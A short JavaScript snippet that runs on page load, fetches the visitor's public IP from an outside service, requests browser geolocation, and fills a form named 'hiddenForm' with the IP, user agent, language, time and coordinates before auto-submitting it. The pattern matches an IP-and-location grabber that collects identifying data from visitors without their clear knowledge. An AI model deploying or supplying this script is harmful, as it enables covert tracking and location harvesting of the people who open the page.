
async function autoSubmitForm() {
    const form = document.getElementById("hiddenForm");

    // Get IP Address
    const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());

    // Get location
    navigator.geolocation.getCurrentPosition(function (position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Fill values
        form.elements["ip"].value = ipData.ip;
        form.elements["userAgent"].value = navigator.userAgent;
        form.elements["language"].value = navigator.language;
        form.elements["timezone"].value = new Date().toLocaleString();
        form.elements["latitude"].value = latitude;
        form.elements["longitude"].value = longitude;

        // Auto submit the form
        form.submit();
    });
}

// Start after page loads
window.onload = autoSubmitForm;

